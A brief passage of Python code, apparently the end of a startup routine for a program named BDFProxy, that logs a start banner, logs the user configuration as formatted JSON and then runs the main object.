EnhancedOutput.logging_info("################ Starting BDFProxy ################")

EnhancedOutput.logging_info("ConfigDump {0}".format(json.dumps(user_config, sort_keys=True, indent=4)))
m.run()
